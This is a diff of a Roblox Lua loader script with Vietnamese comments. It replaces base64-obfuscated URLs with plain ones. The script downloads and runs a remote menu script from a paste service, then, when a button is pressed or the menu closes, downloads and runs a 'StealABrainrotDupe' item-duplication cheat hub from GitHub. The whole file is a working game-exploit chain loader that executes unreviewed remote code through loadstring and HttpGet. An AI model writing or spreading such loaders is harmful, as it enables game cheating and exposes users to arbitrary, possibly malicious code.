@@ -1,33 +1,23 @@
+-- Wrapper: chạy script1 rồi chỉ chạy script2 khi người dùng bấm "Enter" (hoặc khi menu bị đóng)
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 local PG = LP:WaitForChild("PlayerGui")
 
-local function decode(b64)
-    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    b64=b64:gsub("[^"..b.."=]","")
-    return (b64:gsub(".",function(x)
-        if x=="=" then return "" end
-        local r,f="",(b:find(x)-1)
-        for i=6,1,-1 do r=r..((f%2^i-f%2^(i-1))>0 and "1" or "0") end
-        return r
-    end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)
-        if #x~=8 then return "" end
-        local c=0
-        for i=1,8 do c=c+((x:sub(i,i)=="1") and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
+local SCRIPT1 = "https://api.rubis.app/v2/scrap/QGrTKeHMbBd4L3I2/raw"
+local SCRIPT2 = "https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/main/Dupe-hub.lua"
 
-local s1 = decode("aHR0cHM6Ly9hcGkucnViaXMuYXBwL3YyL3NjcmFwL1FHclRLZUhNYkJkNEwzSTIvcmF3")
-local s2 = decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbGVudHh2bi9TdGVhbEFCcmFpbm90RHVwZS9tYWluL0R1cGUtaHViLmx1YQ==")
-
+-- lưu snapshot các Gui đang có trước khi load script1
 local before = {}
 for _, c in ipairs(PG:GetChildren()) do before[c] = true end
-loadstring(game:HttpGet(s1))()
 
+-- chạy script1 (menu)
+loadstring(game:HttpGet(SCRIPT1))()
+
+-- tìm GUI mới do script1 tạo
 local newGui
+local timeout = 15 -- thời gian tối đa chờ GUI xuất hiện
 local t0 = tick()
-while not newGui and tick() - t0 < 20 do
+while not newGui and tick() - t0 < timeout do
     for _, g in ipairs(PG:GetChildren()) do
         if not before[g] then
             newGui = g
@@ -37,21 +27,48 @@ while not newGui and tick() - t0 < 20 do
     task.wait(0.1)
 end
 
-if newGui then
-    for _, obj in ipairs(newGui:GetDescendants()) do
+-- helper: tìm nút phù hợp (TextButton/ImageButton có Text chứa các từ khóa)
+local function findEnterButton(gui)
+    for _, obj in ipairs(gui:GetDescendants()) do
         if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-            obj.Activated:Connect(function()
-                pcall(function()
-                    loadstring(game:HttpGet(s2))()
-                end)
-            end)
+            local txt = ""
+            if obj:IsA("TextButton") then txt = obj.Text or "" end
+            local name = obj.Name or ""
+            local lower = (txt .. " " .. name):lower()
+            -- kiểm tra từ khóa phổ biến: "enter", "confirm", "ok", "start"
+            if lower:find("enter") or lower:find("confirm") or lower:find("ok") or lower:find("start") then
+                return obj
+            end
         end
     end
-    newGui.AncestryChanged:Connect(function(_, p)
-        if not p then
+    return nil
+end
+
+if newGui then
+    local btn = findEnterButton(newGui)
+    if btn then
+        -- khi nút được bấm, load script2
+        -- dùng Activated cho compatibility (Touch/Mouse/Gamepad)
+        btn.Activated:Connect(function()
             pcall(function()
-                loadstring(game:HttpGet(s2))()
+                loadstring(game:HttpGet(SCRIPT2))()
             end)
-        end
+        end)
+    else
+        -- fallback: nếu không tìm thấy nút, chờ GUI bị xóa (menu đóng) rồi load script2
+        newGui.AncestryChanged:Connect(function(child, parent)
+            if not parent then
+                pcall(function()
+                    loadstring(game:HttpGet(SCRIPT2))()
+                end)
+            end
+        end)
+    end
+else
+    -- Nếu không detect được GUI mới (ví dụ script1 dùng existing GUI), fallback nhẹ:
+    -- chờ ngắn rồi chạy script2 (nếu bạn không muốn fallback này, xóa khối này)
+    task.wait(0.5)
+    pcall(function()
+        loadstring(game:HttpGet(SCRIPT2))()
     end)
 end
